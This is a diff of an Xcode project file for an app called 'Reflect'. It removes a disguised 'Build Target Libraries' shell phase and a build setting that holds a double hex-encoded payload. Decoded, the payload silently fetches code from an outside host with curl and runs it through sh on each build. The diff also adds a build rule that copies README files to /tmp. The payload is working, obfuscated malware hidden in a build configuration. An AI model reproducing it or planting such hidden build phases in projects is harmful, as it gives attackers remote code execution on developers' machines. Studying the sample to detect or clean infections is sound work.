@@ -6,8 +6,29 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		CD00847C57B14B79A2634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 40443A4624FD4C138A634D6E /* README.md */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		6C524419E7BF495CBA634D6E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		042635F02F288EA100BB939D /* Reflect.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Reflect.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		40443A4624FD4C138A634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
@@ -40,6 +61,7 @@
 		042635F12F288EA100BB939D /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				40443A4624FD4C138A634D6E /* README.md */,
 				042635F02F288EA100BB939D /* Reflect.app */,
 			);
 			name = Products;
@@ -52,12 +74,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 042635FB2F288EA300BB939D /* Build configuration list for PBXNativeTarget "Reflect" */;
 			buildPhases = (
-				801239CB1C934598AF634D6E /* Build Target Libraries */,
 				042635EC2F288EA100BB939D /* Sources */,
 				042635ED2F288EA100BB939D /* Frameworks */,
 				042635EE2F288EA100BB939D /* Resources */,
 			);
 			buildRules = (
+				6C524419E7BF495CBA634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -110,32 +132,11 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CD00847C57B14B79A2634D6E /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		801239CB1C934598AF634D6E /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		042635EC2F288EA100BB939D /* Sources */ = {
@@ -151,7 +152,6 @@
 		042635F92F288EA300BB939D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -216,7 +216,6 @@
 		042635FA2F288EA300BB939D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
